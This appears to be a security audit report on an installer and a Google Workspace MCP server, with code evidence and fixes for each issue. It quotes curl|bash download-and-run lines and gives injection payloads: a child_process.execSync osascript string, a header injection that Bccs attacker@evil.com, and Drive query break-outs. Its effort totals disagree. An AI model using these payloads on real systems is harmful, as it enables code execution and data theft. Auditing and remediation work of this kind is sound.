# ADW Security Vulnerability Verification Report

> Security Architect | Verified: 2026-02-12
> Codebase: popup-jacob/popup-claude (master, commit 7b16685)
> Methodology: Manual code review against OWASP Top 10 (2021)

---

## Executive Summary

| Metric | Value |
|--------|-------|
| Issues Reported | 12 |
| Issues Verified | 11 confirmed, 1 downgraded (SEC-03) |
| Critical | 2 confirmed |
| High | 7 confirmed |
| Medium | 2 confirmed |
| Total Remediation Estimate | 28-38 hours |

---

## SEC-01 (Critical): curl|bash Install Pattern Without Integrity Verification

**Status: CONFIRMED -- Critical**

**File:** `/Users/popup-kay/Documents/GitHub/popup/popup-claude/installer/install.sh`

**Evidence (lines 350-351):**
```bash
else
    curl -sSL "$BASE_URL/modules/$module_name/install.sh" | bash
```

And in the remote module loading path (lines 101-117):
```bash
local modules_json=$(curl -sSL "$BASE_URL/modules.json" 2>/dev/null || echo "")
# ...
local json=$(curl -sSL "$BASE_URL/modules/$name/module.json" 2>/dev/null || echo "")
```

Also on Windows (`install.ps1`, line 336):
```powershell
irm "$BaseUrl/modules/$ModuleName/install.ps1" | iex
```

**Analysis:**
Remote scripts are downloaded and executed without any checksum or signature verification. An attacker performing a MITM attack, DNS poisoning, or compromising the GitHub repository could inject arbitrary code that runs with the user's full privileges. The `-sSL` flags in curl suppress errors, making tampering harder to detect.

Additionally, at line 13 there is a commented-out usage example encouraging `curl | bash`:
```bash
#   curl -sSL https://raw.githubusercontent.com/.../install.sh | bash -s -- --modules "google,atlassian"
```

**OWASP Category:** A08 - Software and Data Integrity Failures

**Remediation Approach:**
1. Publish SHA-256 checksums in a `checksums.json` manifest signed with a known key.
2. Download scripts to a temp file first, verify checksum, then execute.
3. Consider GPG-signing the release artifacts.

```bash
# Example remediation pattern
download_and_verify() {
    local url="$1"
    local expected_hash="$2"
    local tmpfile=$(mktemp)

    curl -sSL "$url" -o "$tmpfile"
    local actual_hash=$(shasum -a 256 "$tmpfile" | awk '{print $1}')

    if [ "$actual_hash" != "$expected_hash" ]; then
        echo "INTEGRITY CHECK FAILED"
        rm -f "$tmpfile"
        exit 1
    fi

    source "$tmpfile"
    rm -f "$tmpfile"
}
```

**Effort:** 6-8 hours (including checksum generation pipeline, both platforms)

---

## SEC-02 (Critical): Atlassian API Tokens Stored in Plaintext in .mcp.json

**Status: CONFIRMED -- Critical**

**File:** `/Users/popup-kay/Documents/GitHub/popup/popup-claude/installer/modules/atlassian/install.sh`

**Evidence (lines 147-172):**
```javascript
node -e "
const fs = require('fs');
const configPath = '$MCP_CONFIG_PATH';
// ...
config.mcpServers['atlassian'] = {
    command: 'docker',
    args: [
        'run', '-i', '--rm',
        '-e', 'CONFLUENCE_URL=$confluenceUrl',
        '-e', 'CONFLUENCE_USERNAME=$email',
        '-e', 'CONFLUENCE_API_TOKEN=$apiToken',
        '-e', 'JIRA_URL=$jiraUrl',
        '-e', 'JIRA_USERNAME=$email',
        '-e', 'JIRA_API_TOKEN=$apiToken',
        'ghcr.io/sooperset/mcp-atlassian:latest'
    ]
};
fs.writeFileSync(configPath, JSON.stringify(config, null, 2));
"
```

**Analysis:**
The Atlassian API token (`$apiToken`) is written directly into `~/.mcp.json` as a plaintext string inside the Docker `args` array. This file:
- Is a JSON file with default file permissions (typically 644, world-readable).
- Contains credentials that grant full Jira + Confluence API access.
- Persists on disk indefinitely after installation.
- Can be read by any process or user with access to the home directory.

This is also visible in `docker inspect` and `ps` output since tokens are passed as `-e` environment variable arguments.

**OWASP Category:** A02 - Cryptographic Failures

**Remediation Approach:**
1. Store tokens in a Docker `.env` file with restricted permissions (0600).
2. Reference the env file via `--env-file` instead of inline `-e` flags.
3. Set restrictive permissions on `.mcp.json` itself.

```bash
# Create env file with restricted permissions
ENV_FILE="$HOME/.atlassian-mcp.env"
cat > "$ENV_FILE" << EOF
CONFLUENCE_URL=$confluenceUrl
CONFLUENCE_USERNAME=$email
CONFLUENCE_API_TOKEN=$apiToken
JIRA_URL=$jiraUrl
JIRA_USERNAME=$email
JIRA_API_TOKEN=$apiToken
EOF
chmod 600 "$ENV_FILE"

# Reference in .mcp.json args
# args: ['run', '-i', '--rm', '--env-file', '/path/to/.atlassian-mcp.env', ...]
```

Alternatively, use system keychain (macOS Keychain, Windows Credential Manager, Linux libsecret).

**Effort:** 4-6 hours (env file approach), 8-12 hours (keychain approach)

---

## SEC-03 (Critical): Figma Token Exposed in Env Vars in MCP Config

**Status: DOWNGRADED to Informational / Not Applicable**

**File:** `/Users/popup-kay/Documents/GitHub/popup/popup-claude/installer/modules/figma/module.json`

**Evidence (line 24):**
```json
"env": {
    "FIGMA_PERSONAL_ACCESS_TOKEN": "{accessToken}"
}
```

**Analysis:**
The `{accessToken}` value is a **placeholder template**, not an actual token. The `module.json` is a metadata/template file. Examining the actual Figma installer (`/Users/popup-kay/Documents/GitHub/popup/popup-claude/installer/modules/figma/install.sh`), it uses the Figma Remote MCP server with OAuth flow:

```bash
claude mcp add --transport http figma https://mcp.figma.com/mcp
mcp_oauth_flow "figma" "https://mcp.figma.com/mcp"
```

The installer never reads or uses the `mcpConfig.env` block from `module.json`. No actual Figma token is ever written to disk by this code path. The `{accessToken}` is a documentation-only placeholder.

**Recommendation:** While not a live vulnerability, the placeholder could mislead future developers into hardcoding tokens. Add a comment or rename to something clearly template-like (e.g., `"<REPLACE_WITH_TOKEN>"`).

**Effort:** 0.5 hours

---

## SEC-04 (High): token.json Stored Without Encryption

**Status: CONFIRMED -- High**

**File:** `/Users/popup-kay/Documents/GitHub/popup/popup-claude/google-workspace-mcp/src/auth/oauth.ts`

**Evidence (lines 105-108):**
```typescript
function saveToken(token: TokenData): void {
  ensureConfigDir();
  fs.writeFileSync(TOKEN_PATH, JSON.stringify(token, null, 2));
}
```

**Analysis:**
OAuth tokens (access_token, refresh_token) are saved as plaintext JSON to `~/.google-workspace/token.json`. No file permission restrictions are applied. The `ensureConfigDir()` function at line 52 creates the directory with `recursive: true` but does not set restrictive permissions:

```typescript
function ensureConfigDir(): void {
  if (!fs.existsSync(CONFIG_DIR)) {
    fs.mkdirSync(CONFIG_DIR, { recursive: true });
  }
}
```

Default `umask` on most systems creates directories at 755 and files at 644, making the token file readable by all users on the system.

The `.gitignore` at `/Users/popup-kay/Documents/GitHub/popup/popup-claude/google-workspace-mcp/.gitignore` correctly excludes `token.json` and `.google-workspace/`, so accidental commits are prevented. However, the on-disk exposure remains.

**OWASP Category:** A02 - Cryptographic Failures

**Remediation Approach:**
1. Set restrictive file permissions on token.json and the config directory.
2. Consider at-rest encryption with a machine-bound key.

```typescript
function ensureConfigDir(): void {
  if (!fs.existsSync(CONFIG_DIR)) {
    fs.mkdirSync(CONFIG_DIR, { recursive: true, mode: 0o700 });
  }
}

function saveToken(token: TokenData): void {
  ensureConfigDir();
  const tokenPath = TOKEN_PATH;
  fs.writeFileSync(tokenPath, JSON.stringify(token, null, 2), { mode: 0o600 });
}
```

**Effort:** 2 hours (permissions), 6-8 hours (encryption at rest)

---

## SEC-05 (High): Docker Non-Root User Missing

**Status: CONFIRMED -- High**

**File:** `/Users/popup-kay/Documents/GitHub/popup/popup-claude/google-workspace-mcp/Dockerfile`

**Evidence (full file, lines 1-39):**
```dockerfile
FROM node:20-slim AS builder
WORKDIR /app
COPY package*.json ./
COPY tsconfig.json ./
RUN npm install
COPY src ./src
RUN npm run build

FROM node:20-slim
WORKDIR /app
COPY package*.json ./
RUN npm install --omit=dev
COPY --from=builder /app/dist ./dist
RUN mkdir -p /app/.google-workspace
VOLUME ["/app/.google-workspace"]
ENV GOOGLE_CONFIG_DIR=/app/.google-workspace
CMD ["node", "dist/index.js"]
```

**Analysis:**
The production stage runs as `root` (the default in `node:20-slim`). No `USER` directive exists. If an attacker exploits a vulnerability in the Node.js application or its dependencies, they have root access within the container, which can facilitate container escape via kernel exploits or volume mount manipulation.

**OWASP Category:** A05 - Security Misconfiguration

**Remediation Approach:**
```dockerfile
FROM node:20-slim
WORKDIR /app

# Create non-root user
RUN groupadd -r mcp && useradd -r -g mcp -m mcp

COPY package*.json ./
RUN npm install --omit=dev

COPY --from=builder /app/dist ./dist

RUN mkdir -p /app/.google-workspace && chown -R mcp:mcp /app

USER mcp

VOLUME ["/app/.google-workspace"]
ENV GOOGLE_CONFIG_DIR=/app/.google-workspace
CMD ["node", "dist/index.js"]
```

Note: The `VOLUME` mount for `~/.google-workspace` from the host will need matching UID/GID. Document this in setup instructions.

**Effort:** 2-3 hours (including testing volume permission compatibility)

---

## SEC-06 (High): Windows Installer Requires Admin Unnecessarily

**Status: CONFIRMED -- High**

**File:** `/Users/popup-kay/Documents/GitHub/popup/popup-claude/installer/install.ps1`

**Evidence (lines 130-153):**
```powershell
function Test-Admin {
    $identity = [Security.Principal.WindowsIdentity]::GetCurrent()
    $principal = [Security.Principal.WindowsPrincipal]$identity
    return $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}

if (-not (Test-Admin)) {
    Write-Host "Administrator privileges required. Restarting as admin..." -ForegroundColor Yellow
    # ... auto-elevates via Start-Process -Verb RunAs
}
```

**Analysis:**
The installer unconditionally requests administrator elevation for ALL operations, including those that do not require it (e.g., writing to `~/.mcp.json`, pulling Docker images, running `claude mcp add`). Only specific operations like installing Node.js via `winget` or configuring WSL may genuinely need admin rights.

Running the entire installer as admin is a violation of the principle of least privilege. If the installer downloads and executes remote code (see SEC-01), this code runs with full system admin rights.

Notably, the `-list` mode correctly exits before the admin check (line 100-125), showing awareness that not everything needs elevation.

**OWASP Category:** A04 - Insecure Design

**Remediation Approach:**
1. Only elevate for specific operations that genuinely require admin.
2. Split the installer into admin and non-admin phases.

```powershell
# Instead of blanket elevation, use targeted elevation
function Invoke-AsAdmin {
    param([string]$Command)
    Start-Process PowerShell -Verb RunAs -Wait -ArgumentList "-c $Command"
}

# Only elevate when needed
if (-not (Get-Command node -ErrorAction SilentlyContinue)) {
    Invoke-AsAdmin "winget install OpenJS.NodeJS.LTS"
}
# Rest runs as normal user
```

**Effort:** 4-6 hours

---

## SEC-07 (High): Excessive OAuth Scopes

**Status: CONFIRMED -- High**

**File:** `/Users/popup-kay/Documents/GitHub/popup/popup-claude/google-workspace-mcp/src/auth/oauth.ts`

**Evidence (lines 18-25):**
```typescript
const SCOPES = [
  "https://www.googleapis.com/auth/gmail.modify",
  "https://www.googleapis.com/auth/calendar",
  "https://www.googleapis.com/auth/drive",
  "https://www.googleapis.com/auth/documents",
  "https://www.googleapis.com/auth/spreadsheets",
  "https://www.googleapis.com/auth/presentations",
];
```

**Analysis:**
All scopes are requested upfront regardless of which services the user actually needs. Specific concerns:

| Scope | Issue |
|-------|-------|
| `gmail.modify` | Allows read, send, delete, and modify emails. `gmail.readonly` + `gmail.send` would be more appropriate if deletion is not needed. However, the code does use `gmail.users.messages.trash` and label modification, so `modify` is arguably justified by the feature set. |
| `calendar` | Full read/write. `calendar.events` would suffice. |
| `drive` | Full read/write access to all Drive files. `drive.file` (app-created files only) would be safer, but the search/list functionality requires broader access. |
| `documents`, `spreadsheets`, `presentations` | Full read/write to all Google Docs/Sheets/Slides. |

The real issue is that all 6 scopes are requested even if a user only wants Gmail. There is no mechanism for selective scope authorization.

**OWASP Category:** A01 - Broken Access Control (over-permissioning)

**Remediation Approach:**
1. Allow users to select which services they want during setup.
2. Request scopes incrementally based on actual usage.
3. Use the most restrictive scope variant that supports the required operations.

```typescript
// Scope registry: only request what the user enables
const SCOPE_MAP: Record<string, string[]> = {
  gmail: ["https://www.googleapis.com/auth/gmail.modify"],
  calendar: ["https://www.googleapis.com/auth/calendar.events"],
  drive: ["https://www.googleapis.com/auth/drive"],
  docs: ["https://www.googleapis.com/auth/documents"],
  sheets: ["https://www.googleapis.com/auth/spreadsheets"],
  slides: ["https://www.googleapis.com/auth/presentations"],
};

function getScopesForModules(enabledModules: string[]): string[] {
  return enabledModules.flatMap(m => SCOPE_MAP[m] || []);
}
```

**Effort:** 4-6 hours

---

## SEC-08 (High): OAuth Callback Missing State Parameter

**Status: CONFIRMED -- High**

**File:** `/Users/popup-kay/Documents/GitHub/popup/popup-claude/google-workspace-mcp/src/auth/oauth.ts`

**Evidence (lines 113-118):**
```typescript
async function getTokenFromBrowser(oauth2Client: OAuth2Client): Promise<TokenData> {
  const authUrl = oauth2Client.generateAuthUrl({
    access_type: "offline",
    scope: SCOPES,
    prompt: "consent",
  });
```

**Analysis:**
The OAuth `state` parameter is not included in `generateAuthUrl()`. The `state` parameter serves as a CSRF protection mechanism -- without it, an attacker could:

1. Initiate their own OAuth flow.
2. Trick the victim into visiting the callback URL with the attacker's authorization code.
3. The application would then store a token linked to the attacker's account, potentially enabling the attacker to access data the user subsequently stores.

While this is a local-only OAuth flow (localhost callback), the vulnerability is still exploitable if the user has a browser open. The callback handler at line 127-128 also does not validate any state:

```typescript
if (url.pathname === "/callback") {
  const code = url.searchParams.get("code");
```

**OWASP Category:** A07 - Identification and Authentication Failures

**Remediation Approach:**
```typescript
import crypto from "crypto";

async function getTokenFromBrowser(oauth2Client: OAuth2Client): Promise<TokenData> {
  const state = crypto.randomBytes(32).toString("hex");

  const authUrl = oauth2Client.generateAuthUrl({
    access_type: "offline",
    scope: SCOPES,
    prompt: "consent",
    state,
  });

  // In callback handler:
  // const receivedState = url.searchParams.get("state");
  // if (receivedState !== state) {
  //   res.writeHead(403);
  //   res.end("Invalid state parameter - possible CSRF attack");
  //   return;
  // }
```

**Effort:** 1-2 hours

---

## SEC-08a (High): osascript Template Literal Injection

**Status: CONFIRMED -- High**

**File:** `/Users/popup-kay/Documents/GitHub/popup/popup-claude/installer/install.sh`

**Evidence (lines 29-38):**
```bash
parse_json() {
    local json="$1"
    local key="$2"
    osascript -l JavaScript -e "
        var obj = JSON.parse(\`$json\`);
        var keys = '$key'.split('.');
        var val = obj;
        for (var k of keys) val = val ? val[k] : undefined;
        val === undefined ? '' : String(val);
    " 2>/dev/null || echo ""
}
```

**Analysis:**
The `$json` variable is interpolated directly into a JavaScript template literal (backtick string) executed via `osascript`. If the JSON content from a remote `module.json` (fetched via `curl` at line 106) contains backticks, backslashes, or `${...}` expressions, they will be interpreted as JavaScript code.

Attack scenario: If an attacker compromises the GitHub repository or performs a MITM attack on the `modules.json` or `module.json` fetch (which is over HTTPS but see SEC-01), they can inject:
```json
{"name": "${require('child_process').execSync('malicious-command')}"}
```

This would execute arbitrary code on the macOS host via `osascript`.

The same pattern appears at line 104:
```bash
local module_names=$(osascript -l JavaScript -e "JSON.parse(\`$modules_json\`).modules.map(m => m.name).join(' ')" 2>/dev/null)
```

**OWASP Category:** A03 - Injection

**Remediation Approach:**
1. Escape the JSON content before interpolation, or use a safer parsing method.
2. Use `python3 -c` with proper escaping (python3 is available on modern macOS), or use `jq` if available, or use Node.js `JSON.parse` with stdin piping.

```bash
parse_json() {
    local json="$1"
    local key="$2"
    # Safe: pass JSON via stdin, not shell interpolation
    echo "$json" | node -e "
        let data = '';
        process.stdin.on('data', c => data += c);
        process.stdin.on('end', () => {
            try {
                const obj = JSON.parse(data);
                const keys = process.argv[1].split('.');
                let val = obj;
                for (const k of keys) val = val ? val[k] : undefined;
                console.log(val === undefined ? '' : String(val));
            } catch(e) { console.log(''); }
        });
    " "$key" 2>/dev/null || echo ""
}
```

**Effort:** 3-4 hours (refactor parse_json + test across all usage sites)

---

## GWS-07 (High): Drive API Query Injection

**Status: CONFIRMED -- High**

**File:** `/Users/popup-kay/Documents/GitHub/popup/popup-claude/google-workspace-mcp/src/tools/drive.ts`

**Evidence (line 18):**
```typescript
let q = `name contains '${query}' and trashed = false`;
```

**Evidence (line 59):**
```typescript
q: `'${folderId}' in parents and trashed = false`,
```

**Analysis:**
User-supplied `query` and `folderId` values are interpolated directly into Google Drive API query strings without escaping. The Google Drive API uses its own query language. A malicious input containing a single quote (`'`) can break out of the string context and inject arbitrary query operators.

Example attack on `drive_search`:
- Input: `test' or name contains '`
- Resulting query: `name contains 'test' or name contains '' and trashed = false`
- This changes the search semantics, potentially returning files the user should not see in a multi-tenant scenario.

For `drive_list` with `folderId`:
- Input: `root' in parents or '1`
- Resulting query: `'root' in parents or '1' in parents and trashed = false`
- This could list files from arbitrary folders.

While the Google Drive API limits exposure to the authenticated user's files, this is still a query injection that could be exploited in shared-drive environments or by an LLM being prompt-injected.

**OWASP Category:** A03 - Injection

**Remediation Approach:**
```typescript
function escapeDriveQuery(input: string): string {
  // Escape single quotes by replacing ' with \'
  return input.replace(/\\/g, '\\\\').replace(/'/g, "\\'");
}

// Usage:
let q = `name contains '${escapeDriveQuery(query)}' and trashed = false`;
```

Additionally, validate `folderId` to only allow valid Google Drive file ID characters:
```typescript
const DRIVE_ID_PATTERN = /^[a-zA-Z0-9_-]+$/;
if (!DRIVE_ID_PATTERN.test(folderId)) {
  throw new Error("Invalid folder ID format");
}
```

**Effort:** 2-3 hours

---

## GWS-08 (Medium): Email Header Injection in gmail_send

**Status: CONFIRMED -- Medium**

**File:** `/Users/popup-kay/Documents/GitHub/popup/popup-claude/google-workspace-mcp/src/tools/gmail.ts`

**Evidence (lines 113-121):**
```typescript
const messageParts = [
    `To: ${to}`,
    cc ? `Cc: ${cc}` : "",
    bcc ? `Bcc: ${bcc}` : "",
    `Subject: =?UTF-8?B?${Buffer.from(subject).toString("base64")}?=`,
    "Content-Type: text/plain; charset=utf-8",
    "",
    body,
].filter(Boolean).join("\n");
```

**Analysis:**
The `to`, `cc`, and `bcc` fields are interpolated directly into RFC 2822 email headers without validation. If a value contains newline characters (`\r\n` or `\n`), an attacker can inject additional headers:

- Input `to`: `victim@example.com\r\nBcc: attacker@evil.com`
- This would add an extra Bcc header, sending a copy to the attacker.

The `subject` field is properly base64-encoded (line 117), which is good practice. But `to`, `cc`, and `bcc` are not sanitized.

Note: The Gmail API may reject some malformed MIME messages, providing a partial defense-in-depth. But the RFC 2822 raw format allows header injection if newlines are present.

The same pattern exists in `gmail_draft_create` (lines 155-162).

**OWASP Category:** A03 - Injection

**Remediation Approach:**
```typescript
function sanitizeEmailHeader(value: string): string {
  // Remove CR and LF characters to prevent header injection
  return value.replace(/[\r\n]/g, '');
}

function validateEmail(email: string): boolean {
  // Basic email format validation
  return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
}

// Usage:
const safeTo = sanitizeEmailHeader(to);
if (!validateEmail(safeTo)) {
  throw new Error("Invalid email address format");
}

const messageParts = [
    `To: ${safeTo}`,
    cc ? `Cc: ${sanitizeEmailHeader(cc)}` : "",
    bcc ? `Bcc: ${sanitizeEmailHeader(bcc)}` : "",
    // ...
];
```

**Effort:** 2 hours (both gmail_send and gmail_draft_create)

---

## SEC-12 (Medium): Variable Escaping Issues in atlassian/install.sh

**Status: CONFIRMED -- Medium**

**File:** `/Users/popup-kay/Documents/GitHub/popup/popup-claude/installer/modules/atlassian/install.sh`

**Evidence (lines 147-172):**
```bash
node -e "
const fs = require('fs');
const configPath = '$MCP_CONFIG_PATH';
let config = { mcpServers: {} };

if (fs.existsSync(configPath)) {
    config = JSON.parse(fs.readFileSync(configPath, 'utf8'));
    if (!config.mcpServers) config.mcpServers = {};
}

config.mcpServers['atlassian'] = {
    command: 'docker',
    args: [
        'run', '-i', '--rm',
        '-e', 'CONFLUENCE_URL=$confluenceUrl',
        '-e', 'CONFLUENCE_USERNAME=$email',
        '-e', 'CONFLUENCE_API_TOKEN=$apiToken',
        '-e', 'JIRA_URL=$jiraUrl',
        '-e', 'JIRA_USERNAME=$email',
        '-e', 'JIRA_API_TOKEN=$apiToken',
        'ghcr.io/sooperset/mcp-atlassian:latest'
    ]
};

fs.writeFileSync(configPath, JSON.stringify(config, null, 2));
"
```

**Analysis:**
Shell variables `$confluenceUrl`, `$email`, `$apiToken`, `$jiraUrl`, and `$MCP_CONFIG_PATH` are interpolated directly into a `node -e` inline script. If any of these values contain:
- Single quotes (`'`) -- breaks the JavaScript string literals
- Backticks (`` ` ``) -- could be interpreted as template literals
- Backslashes (`\`) -- could escape subsequent characters
- Dollar signs (`$`) -- could trigger shell variable expansion within the node command
- Newlines -- could break the inline script

Likely real-world trigger: A user's Atlassian URL or API token containing special characters would corrupt the `.mcp.json` file or cause the script to fail silently. A deliberately crafted input could achieve code execution within the `node -e` context.

The same pattern exists in `/Users/popup-kay/Documents/GitHub/popup/popup-claude/installer/modules/google/install.sh` at lines 330-346.

**OWASP Category:** A03 - Injection

**Remediation Approach:**
Pass values via environment variables to Node.js instead of shell interpolation:

```bash
MCP_CONFIG_PATH="$HOME/.mcp.json" \
ATLASSIAN_URL="$confluenceUrl" \
ATLASSIAN_EMAIL="$email" \
ATLASSIAN_TOKEN="$apiToken" \
JIRA_URL="$jiraUrl" \
node -e "
const fs = require('fs');
const configPath = process.env.MCP_CONFIG_PATH;
const confluenceUrl = process.env.ATLASSIAN_URL;
const email = process.env.ATLASSIAN_EMAIL;
const apiToken = process.env.ATLASSIAN_TOKEN;
const jiraUrl = process.env.JIRA_URL;

let config = { mcpServers: {} };
if (fs.existsSync(configPath)) {
    config = JSON.parse(fs.readFileSync(configPath, 'utf8'));
    if (!config.mcpServers) config.mcpServers = {};
}

config.mcpServers['atlassian'] = {
    command: 'docker',
    args: [
        'run', '-i', '--rm',
        '-e', 'CONFLUENCE_URL=' + confluenceUrl,
        '-e', 'CONFLUENCE_USERNAME=' + email,
        '-e', 'CONFLUENCE_API_TOKEN=' + apiToken,
        '-e', 'JIRA_URL=' + jiraUrl,
        '-e', 'JIRA_USERNAME=' + email,
        '-e', 'JIRA_API_TOKEN=' + apiToken,
        'ghcr.io/sooperset/mcp-atlassian:latest'
    ]
};

fs.writeFileSync(configPath, JSON.stringify(config, null, 2));
"
```

**Effort:** 3-4 hours (fix in atlassian/install.sh and google/install.sh, both platforms)

---

## Remediation Priority Matrix

| Priority | Issue | Severity | Effort | Risk if Unpatched |
|----------|-------|----------|--------|-------------------|
| 1 | SEC-01 | Critical | 6-8h | Remote code execution via MITM |
| 2 | SEC-08a | High | 3-4h | Code execution via osascript injection |
| 3 | SEC-02 | Critical | 4-6h | Credential theft from plaintext storage |
| 4 | SEC-04 | High | 2h | OAuth token theft |
| 5 | SEC-08 | High | 1-2h | OAuth CSRF attack |
| 6 | GWS-07 | High | 2-3h | Drive query manipulation |
| 7 | SEC-12 | Medium | 3-4h | Script injection via special chars |
| 8 | GWS-08 | Medium | 2h | Email header injection |
| 9 | SEC-05 | High | 2-3h | Container privilege escalation |
| 10 | SEC-06 | High | 4-6h | Excessive OS privileges |
| 11 | SEC-07 | High | 4-6h | Over-permissioned OAuth scopes |
| 12 | SEC-03 | Info | 0.5h | Template placeholder (no active risk) |

**Total estimated effort: 34-49 hours**

---

## Cross-Cutting Concerns Identified During Review

### 1. No Input Validation Layer
There is no centralized input validation/sanitization layer. Each tool handler directly uses input from the LLM/user. A shared validation utility should be created.

### 2. Error Messages May Leak Internal Details
The `oauth.ts` error handler at line 157 returns a generic HTML error, which is acceptable. However, the installer scripts output raw error messages that could leak path information.

### 3. No Security Logging
There is no audit logging for security-relevant events (failed auth attempts, token refreshes, file access operations). This corresponds to OWASP A09 (Security Logging and Monitoring Failures).

### 4. Dependencies Not Audited
No `npm audit` step exists in the build pipeline. The Dockerfile does not pin dependency versions with `npm ci` (uses `npm install` instead).

---

## Conclusion

Of the 12 reported issues, 11 are verified as genuine security vulnerabilities. SEC-03 (Figma token) is downgraded to informational since the value is a template placeholder, not an actual credential. The most critical issues are SEC-01 (remote code execution via unverified downloads) and SEC-02 (plaintext credential storage), which should be addressed before any public release. The injection-class vulnerabilities (SEC-08a, GWS-07, GWS-08, SEC-12) represent the next priority tier and are straightforward to remediate with proper input sanitization patterns.
